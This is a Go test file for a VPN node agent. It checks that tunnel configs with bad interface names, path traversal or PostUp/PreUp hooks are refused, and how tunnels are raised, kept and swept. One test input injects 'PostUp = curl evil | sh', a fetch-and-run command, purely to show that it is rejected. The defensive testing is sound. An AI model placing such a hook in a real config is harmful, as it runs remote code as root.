package chain

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/icecompany-tech/iceslab/apps/node/internal/dto"
)

// Phase 8.2: the AWG tunnels under the legs, the agent's half.

const tunnelConfReceiving = `[Interface]
PrivateKey = cHJpdmF0ZS1rZXktb2YtdGhlLXJlY2VpdmluZy1lbmQ=
Address = 10.67.0.2/30
ListenPort = 27000
Table = off
Jc = 4
Jmin = 80
Jmax = 400
S1 = 20
S2 = 30
S3 = 12
S4 = 7
H1 = 1111
H2 = 2222
H3 = 3333
H4 = 4444

[Peer]
PublicKey = cHVibGljLWtleS1vZi10aGUtZGlhbGxpbmctZW5kLTA=
AllowedIPs = 10.67.0.1/32
`

func TestATunnelIsRefusedUnlessItIsALegTunnel(t *testing.T) {
	ok := dto.ChainTunnel{Iface: "awg-l0", Conf: tunnelConfReceiving, ListenPort: 27000}
	if err := validateTunnel(ok); err != nil {
		t.Fatalf("a good tunnel was refused: %v", err)
	}
	refused := map[string]dto.ChainTunnel{
		// Names that belong to something else on the machine.
		"the users' interface": {Iface: "awg0", Conf: tunnelConfReceiving},
		"eth0":                 {Iface: "eth0", Conf: tunnelConfReceiving},
		"prefix alone":         {Iface: "awg-l", Conf: tunnelConfReceiving},
		"four digits":          {Iface: "awg-l1000", Conf: tunnelConfReceiving},
		"a path":               {Iface: "awg-l1/../x", Conf: tunnelConfReceiving},
		// awg-quick runs these as root.
		"PostUp": {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PostUp = curl evil | sh", 1)},
		"PreUp":  {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PreUp = id", 1)},
		"DNS":    {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "DNS = 1.1.1.1", 1)},
		"two peers": {Iface: "awg-l1", Conf: tunnelConfReceiving + "\n[Peer]\nPublicKey = x\n"},
		"no peer":   {Iface: "awg-l1", Conf: strings.Split(tunnelConfReceiving, "[Peer]")[0]},
		"a port":    {Iface: "awg-l1", Conf: tunnelConfReceiving, ListenPort: 70000},
	}
	for name, tun := range refused {
		if err := validateTunnel(tun); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// fakeHost stands in for the machine: interfaces that exist, and every command.
type fakeHost struct {
	links map[string]bool
	calls []string
}

func (h *fakeHost) run(_ context.Context, name string, args ...string) ([]byte, error) {
	h.calls = append(h.calls, filepath.Base(name)+" "+strings.Join(args, " "))
	switch {
	case filepath.Base(name) == "awg-quick" && args[0] == "up":
		h.links[strings.TrimSuffix(filepath.Base(args[1]), ".conf")] = true
	case filepath.Base(name) == "awg-quick" && args[0] == "down":
		delete(h.links, strings.TrimSuffix(filepath.Base(args[1]), ".conf"))
	case filepath.Base(name) == "ip" && args[0] == "link" && args[1] == "del":
		delete(h.links, args[2])
	}
	return nil, nil
}

func (h *fakeHost) list() ([]string, error) {
	out := []string{}
	for l := range h.links {
		out = append(out, l)
	}
	return out, nil
}

func tunnelManager(t *testing.T, h *fakeHost, opened *[]string) (*Manager, string) {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "chain")
	return New(Config{
		BinaryPath: "sing-box",
		ConfigPath: filepath.Join(dir, "config.json"),
		Logger:     quiet(),
		Run:        h.run,
		ListLinks:  h.list,
		LinkExists: func(iface string) bool { return h.links[iface] },
		OpenTunnel: func(_ context.Context, iface string, port int) {
			*opened = append(*opened, iface)
		},
	}), dir
}

func TestTunnelsAreRaisedOnceAndKeptOnAPushThatChangesNothing(t *testing.T) {
	h := &fakeHost{links: map[string]bool{"eth0": true, "awg0": true}}
	var opened []string
	m, dir := tunnelManager(t, h, &opened)
	tun := dto.ChainTunnel{Iface: "awg-l3", Conf: tunnelConfReceiving, ListenPort: 27003}

	if err := m.applyTunnels(context.Background(), []dto.ChainTunnel{tun}); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "awg-l3.conf")
	if want := []string{"awg-quick up " + path}; !reflect.DeepEqual(h.calls, want) {
		t.Fatalf("first apply ran %v, want %v", h.calls, want)
	}
	got, err := os.ReadFile(path)
	if err != nil || string(got) != tunnelConfReceiving {
		t.Fatalf("config on disk: %q, %v", got, err)
	}
	if info, _ := os.Stat(path); info.Mode().Perm() != 0o600 {
		t.Fatalf("the tunnel config holds a private key and is %v", info.Mode().Perm())
	}

	// Same block again: nothing bounces.
	h.calls = nil
	if err := m.applyTunnels(context.Background(), []dto.ChainTunnel{tun}); err != nil {
		t.Fatal(err)
	}
	if len(h.calls) != 0 {
		t.Fatalf("a push that changed nothing ran %v", h.calls)
	}

	// A changed config: down, then up.
	h.calls = nil
	tun.Conf = strings.Replace(tunnelConfReceiving, "Jc = 4", "Jc = 5", 1)
	if err := m.applyTunnels(context.Background(), []dto.ChainTunnel{tun}); err != nil {
		t.Fatal(err)
	}
	if want := []string{"awg-quick down " + path, "awg-quick up " + path}; !reflect.DeepEqual(h.calls, want) {
		t.Fatalf("a changed tunnel ran %v, want %v", h.calls, want)
	}
	if len(opened) == 0 || opened[0] != "awg-l3" {
		t.Fatalf("the firewall was not opened for the tunnel: %v", opened)
	}
}

func TestTheSweepTakesDownOnlyLegTunnelsThatAreNotSent(t *testing.T) {
	// awg-l7 has its config on disk, awg-l9 was raised by hand with none, awg0
	// is the users' interface and must be left alone.
	h := &fakeHost{links: map[string]bool{"eth0": true, "awg0": true, "awg-l7": true, "awg-l9": true}}
	var opened []string
	m, dir := tunnelManager(t, h, &opened)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "awg-l7.conf"), []byte(tunnelConfReceiving), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := m.applyTunnels(context.Background(), nil); err != nil {
		t.Fatal(err)
	}
	want := map[string]bool{"awg-quick down " + filepath.Join(dir, "awg-l7.conf"): true, "ip link del awg-l9": true}
	if len(h.calls) != 2 || !want[h.calls[0]] || !want[h.calls[1]] {
		t.Fatalf("sweep ran %v, want %v", h.calls, want)
	}
	if !h.links["awg0"] || !h.links["eth0"] {
		t.Fatalf("the sweep touched an interface that is not a leg tunnel: %v", h.links)
	}
	if _, err := os.Stat(filepath.Join(dir, "awg-l7.conf")); !os.IsNotExist(err) {
		t.Fatalf("the swept tunnel's config (a private key) was left on disk")
	}
}

func TestAChainWithATunnelItWillNotRaiseIsRefusedWhole(t *testing.T) {
	h := &fakeHost{links: map[string]bool{}}
	var opened []string
	m, dir := tunnelManager(t, h, &opened)
	b := block(goldenConfig)
	b.Tunnels = []dto.ChainTunnel{{Iface: "awg0", Conf: tunnelConfReceiving}}
	if err := m.Apply(context.Background(), b); err == nil {
		t.Fatal("a tunnel named awg0 was accepted")
	}
	if len(h.calls) != 0 {
		t.Fatalf("something ran before the refusal: %v", h.calls)
	}
	if _, err := os.Stat(filepath.Join(dir, "config.json")); !os.IsNotExist(err) {
		t.Fatal("the chain config was written for a block that was refused")
	}
	if st := m.Status(); st == nil || !strings.Contains(st.Error, "awg0") {
		t.Fatalf("the refusal does not say what was refused: %+v", st)
	}
}
